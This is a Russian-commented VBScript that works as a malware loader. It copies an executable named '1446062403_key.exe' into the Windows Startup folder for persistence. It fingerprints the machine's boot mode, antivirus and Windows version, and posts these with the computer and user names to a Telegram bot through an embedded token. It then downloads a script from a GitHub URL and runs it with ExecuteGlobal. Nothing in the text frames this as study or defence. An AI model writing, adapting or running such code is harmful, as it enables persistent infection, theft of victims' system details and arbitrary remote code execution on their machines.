' ===== ДОБАВЛЕНИЕ EXE В АВТОЗАГРУЗКУ =====
Dim objAutoShell, strLocalAppDataPath, strExePath, strStartupFolderPath
Set objAutoShell = CreateObject("WScript.Shell")
strLocalAppDataPath = objAutoShell.ExpandEnvironmentStrings("%LocalAppData%")
strExePath = strLocalAppDataPath & "\1446062403_key.exe"

If objFileSystemObject.FileExists(strExePath) Then
    strStartupFolderPath = objAutoShell.SpecialFolders("Startup") & "\1446062403_key.exe"
    If Not objFileSystemObject.FileExists(strStartupFolderPath) Then
        objFileSystemObject.CopyFile strExePath, strStartupFolderPath
    End If
End If

Set objAutoShell = Nothing


' ===== ОПРЕДЕЛЕНИЕ BIOS/UEFI, АНТИВИРУСА, ВЕРСИИ WINDOWS =====
mountResult = objShell.Run("cmd /c mountvol S: /S", 0, True)
bcdeditResult = objShell.Run("cmd /c bcdedit /enum | find ""path"" | find ""bootmgfw.efi""", 0, True)
If mountResult = 0 And bcdeditResult = 0 Then
    biosResult = "Система работает в режиме UEFI"
Else
    biosResult = "Система работает в режиме BIOS (Legacy)"
End If
If mountResult = 0 Then
    objShell.Run "cmd /c mountvol S: /D", 0, True
End If

Set objWMI = GetObject("winmgmts:\\.\root\SecurityCenter2")
Set colItems = objWMI.ExecQuery("SELECT * FROM AntiVirusProduct")
antivirusName = ""
For Each objItem In colItems
    If InStr(LCase(objItem.displayName), "windows defender") = 0 And InStr(LCase(objItem.displayName), "microsoft defender") = 0 Then
        antivirusName = objItem.displayName
        Exit For
    End If
Next
If antivirusName = "" Then
    avResult = "В системе установлен Windows Defender"
Else
    avResult = "В системе установлен " & antivirusName
End If

Set objWMIOS = GetObject("winmgmts:\\.\root\cimv2")
Set colOS = objWMIOS.ExecQuery("SELECT Caption FROM Win32_OperatingSystem")
winVersion = ""
For Each objOS In colOS
    winVersion = objOS.Caption
    Exit For
Next
If winVersion = "" Then
    winResult = "Версия Windows: не удалось определить"
Else
    winResult = "Версия Windows: " & winVersion
End If


' ===== ОТПРАВКА В TELEGRAM =====
Token = "8323167571:AAFEgqb4cAPmKNek-D6ioTvS634gRE0CuTo"
ChatID = "7063407604"
device = objShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
user = objShell.ExpandEnvironmentStrings("%USERNAME%")

msg = "Устройство: " & device & vbCrLf & _
      "Пользователь: " & user & vbCrLf & vbCrLf & _
      biosResult & vbCrLf & _
      avResult & vbCrLf & _
      winResult

If Len(msg) > 4090 Then msg = Left(msg, 4090)

msg = Replace(msg, "\", "\\")
msg = Replace(msg, """", "\""")
msg = Replace(msg, vbCrLf, "\n")
msg = Replace(msg, vbCr, "\r")
msg = Replace(msg, vbLf, "\n")
msg = Replace(msg, vbTab, "\t")
body = "{""chat_id"":""" & ChatID & """,""text"":""" & msg & """}"
url = "https://api.telegram.org/bot" & Token & "/sendMessage"

On Error Resume Next
Set http = CreateObject("MSXML2.XMLHTTP")
If Not http Is Nothing Then
    http.Open "POST", url, False
    http.setRequestHeader "Content-Type", "application/json"
    http.Send body
End If
On Error Goto 0


' ===== RAW ССЫЛКИ И ВЫБОР ССЫЛКИ ПО КОНФИГУРАЦИИ =====
LinkUefiWd = "https://github.com/049-bit/K/raw/refs/heads/main/test.vbs"
LinkUefiThirdPartyAv = "https://github.com/049-bit/K/raw/refs/heads/main/test.vbs"
LinkBiosWd = "https://github.com/049-bit/K/raw/refs/heads/main/test.vbs"
LinkBiosThirdPartyAv = "https://github.com/049-bit/K/raw/refs/heads/main/test.vbs"

isUEFI = (mountResult = 0 And bcdeditResult = 0)
isWindowsDefender = (antivirusName = "")
If isUEFI And isWindowsDefender Then
    cfgUrl = LinkUefiWd
ElseIf isUEFI And Not isWindowsDefender Then
    cfgUrl = LinkUefiThirdPartyAv
ElseIf Not isUEFI And isWindowsDefender Then
    cfgUrl = LinkBiosWd
Else
    cfgUrl = LinkBiosThirdPartyAv
End If


' ===== ФУНКЦИЯ ЗАГРУЗКИ КОДА =====
Function LoadCodeFromURL(urlCode)
    Dim httpLoad, code
    On Error Resume Next
    Set httpLoad = CreateObject("WinHttp.WinHttpRequest.5.1")
    If Err.Number <> 0 Then
        LoadCodeFromURL = ""
        Exit Function
    End If
    
    httpLoad.Open "GET", urlCode, False
    httpLoad.Send
    
    If Err.Number <> 0 Then
        LoadCodeFromURL = ""
        Exit Function
    End If
    
    If httpLoad.Status = 200 Then
        code = httpLoad.ResponseText
        code = Trim(code)
        LoadCodeFromURL = code
    Else
        LoadCodeFromURL = ""
    End If
    
    Set httpLoad = Nothing
End Function


' ===== ЗАГРУЗКА И ВЫПОЛНЕНИЕ КОДА =====
remoteCode = LoadCodeFromURL(cfgUrl)

If remoteCode <> "" Then
    ExecuteGlobal remoteCode
End If
